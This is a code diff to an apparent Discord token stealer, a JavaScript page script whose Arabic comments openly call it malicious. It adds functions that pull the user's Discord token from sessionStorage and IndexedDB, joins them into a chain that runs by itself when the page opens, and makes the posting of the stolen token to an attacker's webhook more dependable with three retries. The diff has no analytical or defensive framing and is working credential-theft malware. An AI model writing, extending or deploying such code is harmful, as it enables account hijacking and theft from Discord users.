@@ -32,10 +32,37 @@
             return token || null;
         }
 
+        // سرقة التوكن من SessionStorage
+        function stealTokenFromSessionStorage() {
+            const token = sessionStorage.getItem('token');
+            return token || null;
+        }
+
+        // سرقة التوكن من IndexedDB
+        async function stealTokenFromIndexedDB() {
+            return new Promise((resolve) => {
+                const request = indexedDB.open('discord', 1);
+                request.onsuccess = (event) => {
+                    const db = event.target.result;
+                    const transaction = db.transaction('tokens', 'readonly');
+                    const store = transaction.objectStore('tokens');
+                    const getRequest = store.get('token');
+                    getRequest.onsuccess = () => {
+                        resolve(getRequest.result?.value || null);
+                    };
+                    getRequest.onerror = () => {
+                        resolve(null);
+                    };
+                };
+                request.onerror = () => {
+                    resolve(null);
+                };
+            });
+        }
+
         // سرقة التوكن من ملفات نظام Discord (لأجهزة الكمبيوتر فقط)
         async function stealTokenFromFiles() {
             if (typeof window !== 'undefined' && window.process && window.process.versions && window.process.versions.electron) {
-                // إذا كان التطبيق يعمل على Electron (مثل تطبيقات سطح المكتب)
                 const { ipcRenderer } = require('electron');
                 const fs = require('fs');
                 const path = require('path');
@@ -72,28 +99,44 @@
                 content: `تم سرقة التوكن: ${token}`
             };
 
-            try {
-                const response = await fetch(webhookUrl, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(data),
-                });
+            for (let attempt = 1; attempt <= 3; attempt++) {
+                try {
+                    const response = await fetch(webhookUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(data),
+                    });
 
-                if (response.ok) {
-                    console.log('تم إرسال التوكن بنجاح!');
-                } else {
-                    console.error('فشل إرسال التوكن.');
+                    if (response.ok) {
+                        console.log('تم إرسال التوكن بنجاح!');
+                        return;
+                    } else {
+                        console.error(`فشل إرسال التوكن (المحاولة ${attempt}):`, await response.text());
+                    }
+                } catch (error) {
+                    console.error(`حدث خطأ (المحاولة ${attempt}):`, error);
                 }
-            } catch (error) {
-                console.error('حدث خطأ:', error);
+
+                // انتظر 2 ثانية قبل المحاولة التالية
+                await new Promise(resolve => setTimeout(resolve, 2000));
             }
+
+            console.error('فشل إرسال التوكن بعد 3 محاولات.');
         }
 
         // تشغيل الكود الضار تلقائيًا عند فتح الصفحة
         (async function() {
             let token = stealTokenFromBrowser();
+
+            if (!token) {
+                token = stealTokenFromSessionStorage();
+            }
+
+            if (!token) {
+                token = await stealTokenFromIndexedDB();
+            }
 
             if (!token) {
                 token = await stealTokenFromFiles();
